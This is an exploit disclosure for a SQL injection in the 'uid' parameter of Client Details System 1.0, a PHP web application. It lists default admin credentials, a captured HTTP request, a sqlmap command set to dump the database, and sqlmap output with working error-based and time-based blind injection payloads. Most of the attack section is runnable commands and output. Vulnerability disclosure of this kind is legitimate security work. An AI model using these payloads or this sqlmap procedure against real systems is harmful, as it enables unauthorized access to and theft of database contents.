# Client_Details_System-SQL_Injection_5
+ **Exploit Title:** Client_Details_System-SQL_Injection_5
+ **Date:** 2023-26-12
+ **Exploit Author:** Hamdi Sevben
+ **Vendor Homepage:** https://code-projects.org/client-details-system-in-php-with-source-code/
+ **Software Link:** https://download-media.code-projects.org/2020/01/CLIENT_DETAILS_SYSTEM_IN_PHP_WITH_SOURCE_CODE.zip
+ **Version:** 1.0
+ **Tested on:** Windows 10 Pro + PHP 8.1.6, Apache 2.4.53
+ **CVE:** CVE-

## References: 

## Description:
Client Details System 1.0 allows SQL Injection via parameter 'uid' in "/clientdetails/admin/update-clients.php?uid=3". Exploiting this issue could allow an attacker to compromise the application, access or modify data,  or exploit latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to the Admin Panel: "http://localhost/clientdetails/admin/"
+ Fill User Id and Password with `admin`:`client123` and log in.
+ Manage Users: "http://localhost/clientdetails/admin/manage-users.php"
+ Then click Edit button for any user: "http://localhost/clientdetails/admin/update-clients.php?uid=3"
+ Intercept the request via Burp Suite and send to Repeater.
+ Copy and paste the request to a "r.txt" file.
+ Captured Burp request:
```
GET /clientdetails/admin/update-clients.php?uid=3 HTTP/1.1
Host: localhost
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
Cookie: PHPSESSID=p5mgq2eci66sik6s94eakcjub9
Referer: http://localhost/clientdetails/admin/clientview.php
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36

```

+ Use sqlmap to exploit. In sqlmap, use 'uid' parameter to dump the database. 
```
python sqlmap.py -r r.txt -p uid --risk 3 --level 5 --threads 1 --random-agent tamper=between,randomcase --proxy="http://127.0.0.1:8080" --dbms mysql --batch --current-db
```

```
---
Parameter: uid (GET)
    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: uid=3'+(SELECT 0x6c464a42 WHERE 4357=4357 AND (SELECT 4176 FROM(SELECT COUNT(*),CONCAT(0x7178626271,(SELECT (ELT(4176=4176,1))),0x7170626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))+'

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uid=3'+(SELECT 0x6b5a6545 WHERE 9285=9285 AND (SELECT 7542 FROM (SELECT(SLEEP(5)))GfcH))+'
---
[18:14:00] [INFO] the back-end DBMS is MySQL
web application technology: PHP 8.1.6, Apache 2.4.53
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[18:14:01] [INFO] fetching current database
[18:14:01] [INFO] retrieved: 'loginsystem'
current database: 'loginsystem'
```

+ current database: `loginsystem`
![5](https://github.com/h4md153v63n/CVEs/assets/5091265/107593ab-0372-4e02-8ce8-727a17c95d5a)
